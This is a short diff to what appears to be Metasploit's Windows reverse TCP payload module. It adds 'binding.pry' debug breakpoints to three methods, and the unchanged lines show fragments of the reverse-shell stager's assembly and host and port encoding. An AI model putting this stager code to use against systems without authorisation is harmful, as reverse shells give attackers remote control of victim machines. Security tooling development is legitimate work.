@@ -34,6 +34,10 @@ module Payload::Windows::ReverseTcp
   # Generate the first stage
   #
   def generate(opts={})
+
+    # debug
+    binding.pry
+    
     ds = opts[:datastore] || datastore
     conf = {
       port:        ds['LPORT'],
@@ -68,6 +72,10 @@ module Payload::Windows::ReverseTcp
   # Generate and compile the stager
   #
   def generate_reverse_tcp(opts={})
+
+    # debug
+    binding.pry
+    
     combined_asm = %Q^
       cld                    ; Clear the direction flag.
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
@@ -108,6 +116,9 @@ module Payload::Windows::ReverseTcp
   #
   def asm_reverse_tcp(opts={})
 
+    # debug
+    binding.pry
+    
     retry_count  = [opts[:retry_count].to_i, 1].max
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
